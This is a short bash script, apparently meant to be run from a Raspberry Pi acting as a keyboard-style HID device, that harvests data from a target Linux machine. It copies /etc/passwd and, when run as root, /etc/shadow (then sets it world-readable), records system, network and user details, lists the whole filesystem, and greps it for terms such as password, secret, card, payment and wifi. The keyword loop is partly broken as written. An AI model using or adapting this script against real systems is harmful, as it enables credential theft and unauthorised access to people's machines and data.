#!/bin/bash


# Script to scrape data from files on a Linux filesystem from a RPi acting as a HID
# Author(s): PolitelyChaotic

cat /etc/passwd &> etcpass.copy

uname -srm > sys.info
hostnamectl >> sys.info
ifconfig &> ifconf
ip addr show &> ipaddr.show

id > user.file
echo "" >> user.file

ls / -R -la &> file.perms

if [[ $(id -u) == "0" ]];
  then
    echo "user is root" >> user.file
    cp /etc/shadow /home/bashgirlie/bashPi/shadow.copy shadow.copy 
    chmod +rwxrwxrwx shadow.copy
  else
    echo "user is not root" >> user.file
fi

keys=("password" "passwd" "important" "private" "secret" "sensitive" "login" "key" "encrypt" "card" "email" "payment" "address" "email" "wifi" "WiFi") 

directory="/"

timeout 60s bash -c '
for key in "${keys[@]}"; do
  grep -r "$key" "$directory" &> log.file
done
'
